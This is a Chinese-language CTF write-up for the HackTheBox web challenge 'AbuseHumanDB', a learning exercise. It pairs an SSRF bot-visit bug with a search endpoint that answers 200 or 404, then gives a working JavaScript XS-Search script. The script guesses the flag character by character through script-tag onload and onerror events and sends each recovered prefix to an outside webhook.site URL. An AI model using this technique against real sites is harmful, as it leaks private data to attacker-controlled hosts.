## 分析

```javascript
if (url.match(uregex)) {
    return bot.visitPage(url)   //SSRF
        .then(() => res.send(response('Your submission is now pending review!')))
        .catch(() => res.send(response('Something went wrong! Please try again!')))
}
```

我们可以利用这个漏洞来在内部搜寻`HTB`相关的内容
```javascript
return db.getEntry(query, isLocalhost(req))
    .then(entries => {
        if(entries.length == 0) return res.status(404).send(response('Your search did not yield any results!'));
        res.json(entries);
    })
```

可以看到，当在本地进行搜索的时候，如果找到则返回`200`，找不到相关内容则返回`404`
那么我们的思路就是在一个可控的服务器上创建一个`HTML`文件来加载`js`，让`js`去帮我们发起请求，从返回的状态码判断这个字符串是否存在
```javascript
try {
    let stmt = await this.db.prepare("SELECT * FROM userEntries WHERE title LIKE ? AND approved = ?");
    resolve(await stmt.all(query, approved));
} catch(e) {
    console.log(e);
}
```

如果存在则发起请求到另一个网址，将字符保存下来

```javascript
var url = "http://127.0.0.1:1337/api/entries/search?q=";

/*
String that will always contain what we know is definitely in the flag
HTB{ is our base case as we know this begins the flag
We build from this base case 
*/
var flag = "HTB{";


/* 
Take care with this alphabet, remove "&" and "%" (query params, wildcard)
and put the underscore at the end as it represents a single character wildcard
and so should be checked last as otherwise it will always be appended to the flag
*/
var a = "{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$'()*+,-./:;<=>@[]^|_";


// Asynchronous as we wish to wait for this to complete before continuing
// Checks the status code when we query with a specific character
async function check(char) {
    return new Promise((resolve, reject) => {

    	// Create a script tag to query the api endpoint with the character via src attribute
        var s = document.createElement("script");
        s.src = url+flag+char;

        // onload: 200 => resolve (character is the next in the flag)
        s.onload = () => {resolve(char);};

        // onerror: 404 => reject (character is invalid)
        s.onerror = () => {reject(char);};

        document.head.appendChild(s);

    });
}


var i = 0;
async function loop() {
    while (true) {
        char = a[i];
        // Check this character, wait for the result, then depending on its result, do 2 different things:
        await check(char).then((res) => {
        	/*
        	1st: if it was resolved (accepted), append it to the string of known characters
        	that begin the flag and send this to a webhook that we control
        	so that we can get also get this information
        	*/
            flag += res;
            fetch("https://webhook.site/b8857ff4-aecc-4ab0-afae-47be1d91813a?"+flag);

            // Start from the first character again
            i = 0;

        }, (res) => {
        	// 2nd: if it was rejected, move onto the next character
        	i++;

        });
    }
}

loop();
```

# 参考链接

[https://x-c-3.github.io/posts/hackthebox-web-abusehumandb/#!](https://x-c-3.github.io/posts/hackthebox-web-abusehumandb/#!)